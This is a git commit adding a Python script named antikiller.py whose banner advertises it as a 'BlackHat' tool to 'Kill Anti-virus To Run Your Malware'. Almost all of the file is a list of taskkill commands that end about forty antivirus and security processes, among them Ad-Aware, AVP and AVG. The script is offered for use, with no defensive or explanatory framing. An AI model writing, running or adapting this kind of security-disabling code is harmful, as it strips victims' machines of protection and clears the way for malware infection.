14e97a9219e62e78e434b4dc0ced725f66b838a7
Mohamed Khaled Fathy <sirmatrixpage@gmail.com>
2016-08-02 23:19:25 +0200

    Add files via upload

---
+++ antikiller.py
@@ -0,0 +1,66 @@
+#!/usr/bin/env python
+# Developed By SirMatrix
+
+import os
+print '''
+
+=======================================================
+  _  ___ _ _   __   ___
+ | |/ (_) | |__\ \ / (_)_ _ _  _ ___
+ | ' <| | | |___\ V /| | '_| || (_-<
+ |_|\_\_|_|_|    \_/ |_|_|  \_,_/__/
+
+ Kill Anti-virus To Run Your Malware [ BlackHat ]
+
+ =======================================================
+'''
+
+# Kill All Antivirus EXE
+
+os.system("taskkill /im AAWTray.exe")
+os.system("taskkill /im Ad-Aware.exe")
+os.system("taskkill /im MSASCui.exe")
+os.system("taskkill /im _avp32.exe")
+os.system("taskkill /im MSASCui.exe")
+os.system("taskkill /im _avpcc.exe")
+os.system("taskkill /im _avpm.exe")
+os.system("taskkill /im aAvgApi.exe")
+os.system("taskkill /im ackwin32.exe")
+os.system("taskkill /im adaware.exe")
+os.system("taskkill /im advxdwin.exe")
+os.system("taskkill /im agentsvr.exe")
+os.system("taskkill /im agentw.exe")
+os.system("taskkill /im alertsvc.exe")
+os.system("taskkill /im alevir.exe")
+os.system("taskkill /im alogserv.exe")
+os.system("taskkill /im amon9x.exe")
+os.system("taskkill /im anti-trojan.exe")
+os.system("taskkill /im antivirus.exe")
+os.system("taskkill /im ants.exe")
+os.system("taskkill /im apimonitor.exe")
+os.system("taskkill /im aplica32.exe")
+os.system("taskkill /im apvxdwin.exe")
+os.system("taskkill /im arr.exe")
+os.system("taskkill /im atcon.exe")
+os.system("taskkill /im atguard.exe")
+os.system("taskkill /im atro55en.exe")
+os.system("taskkill /im atupdater.exe")
+os.system("taskkill /im atwatch.exe")
+os.system("taskkill /im au.exe")
+os.system("taskkill /im aupdate.exe")
+os.system("taskkill /im auto-protect.nav80try.exe")
+os.system("taskkill /im autodown.exe")
+os.system("taskkill /im autotrace.exe")
+os.system("taskkill /im autoupdate.exe")
+os.system("taskkill /im avconsol.exe")
+os.system("taskkill /im ave32.exe")
+os.system("taskkill /im avgcc32.exe")
+os.system("taskkill /im avgctrl.exe")
+os.system("taskkill /im avgemc.exe")
+
+print ("End , Bye ")
+
+
+
+
+
